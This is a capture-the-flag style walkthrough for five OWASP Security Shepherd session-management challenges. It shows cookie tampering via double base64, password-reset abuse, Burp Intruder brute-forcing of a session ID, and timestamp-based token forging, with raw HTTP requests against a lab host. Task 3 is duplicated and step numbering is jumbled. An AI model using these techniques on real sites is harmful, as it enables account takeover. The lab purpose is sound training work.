# OWASP Security Shepherd  Session Management 

This guide will walk you through five different web-based challenges that involve manipulating cookies, brute-forcing encoded values, and intercepting HTTP requests.

---

## **Task 1: Bypassing Admin Access with Modified Cookies**
**Objective:** Gain admin access to retrieve the key.

### **Steps:**
1. **Decode the `SubSessionID` Cookie:**
   - The `SubSessionID` is base64-encoded **twice**.
   - Decode it twice to reveal `guest12`.

2. **Replace `current` Cookie with Admin:**
   - Encode `administrator` in base64 once.
   - Replace `current` cookie with the encoded value.

3. **Modify POST Request Data:**
   - Change:
     ```
     adminDetected=false&returnPassword=false&upgradeUserToAdmin=false
     ```
   - To:
     ```
     adminDetected=true&returnPassword=true&upgradeUserToAdmin=true
     ```

4. **Send the modified request** to gain access.

---

## **Task 2: Extracting Admin Credentials via Password Reset**
**Objective:** Retrieve the admin password from a reset response.

### **Steps:**
1. **Find Admin Email:**
   - Enter `admin` in the login form.
   - The response contains `zoidberg22@shepherd.com`.

2. **Trigger Password Reset:**
   - Request a password reset for `zoidberg22@shepherd.com`.

3. **Extract New Password from Response:**
   - The response contains:  
     ```
     Changed To: -49189122767280649395999113217915861064
     ```
   - This is the new password.

4. **Login** :)

---

## **Task 3: Resetting Password via Cookie Manipulation**
**Objective:** Change admin password by modifying session cookies.

### **Steps:**
5. **Modify Password via the Toggle User Functionality:**
- Send the following POST request:
```http
  POST /challenges/t193c6634f049bcf65cdcac72269eeac25dbb2a6887bdb38873e57d0ef447bc3 HTTP/1.1
  Host: webserver
  Cookie: current=WjNWbGMzUXhNZz09; ...
  
  subUserName=admin&subUserPassword=123456789
```

1. **Change `current` Cookie to Admin:**
- Encode `admin` in base64 **twice**.
- Replace the `current` cookie with the encoded value.

2. **Login with:**

---

## **Task 3: Resetting Password via Cookie Manipulation**
**Objective:** Change admin password by modifying session cookies.

### **Steps:**

1. **Modify Password via the Toggle User Functionality:**
- Send the following POST request:
```http
  POST /challenges/t193c6634f049bcf65cdcac72269eeac25dbb2a6887bdb38873e57d0ef447bc3 HTTP/1.1
  Host: webserver
  Cookie: current=WjNWbGMzUXhNZz09; ...
  
  subUserName=admin&subUserPassword=123456789
```

2. **Change `current` Cookie to Admin:**
- Encode `admin` in base64 **twice**.
- Replace the `current` cookie with the encoded value.

1. **Login :)

---

## **Task 4: Bypassing Security with Brute-Force Attack**
**Objective:** Bypass admin security using Burp Suite Intruder.

### **Steps:**

2. **Identify the Authentication Mechanism:**
- The page uses `SubSessionID` for validation, **not** `userId`.

3. **Brute Force `SubSessionID`:**
- Use **Burp Suite Intruder** with these settings:
  - **Payload:** Numerical (16 digits)
  - **From** 0
  - **To** 999
  - **Min Integer Digits:** 16
  - **Max Integer Digits:** 16
  - **Payload Processing:** Encode with base64 **twice**.

4. **Check Responses:**
- One request will return a success message containing the key.

---

## **Task 5: Resetting Password via Token Exploitation**
**Objective:** Generate a valid token to reset the admin password.

### **Steps:**

5. **Intercept the Password Reset Request:**
   - Capture the following request in Burp Suite or another intercepting proxy:
```http
     POST /challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1SendToken HTTP/1.1
     Host: webserver
     Cookie: current=WjNWbGMzUXhNZz09; ...
     
     subUserName=admin
```

6. **Extract the Server Timestamp from the Response:**
   - The response will contain a timestamp. Copy this value.

7. **Format the Timestamp Correctly:**
   - Convert the extracted timestamp into the following format:
     ```
     Day(3 chars) Month(3 chars) Day HH:MM:SS GMT Year
     ```
   - Example:
     ```
     Tue Feb 06 12:34:56 GMT 2025
     ```

8. **Encode the Formatted Timestamp:**
   - Encode the formatted timestamp in **Base64** **twice**.
   - This will be your `resetPasswordToken`.

9. **Send a Request to Change the Password:**
   - Modify the original request by changing `SendToken` to `ChangePass`.
   - Include the newly generated `resetPasswordToken`:
```http
     POST /challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1ChangePass HTTP/1.1
     Host: webserver
     Cookie: current=WjNWbGMzUXhNZz09; ...
     
     userName=admin&newPassword=adminadminadmin&resetPasswordToken=*your token*
```

10. **Login with the New Password :)
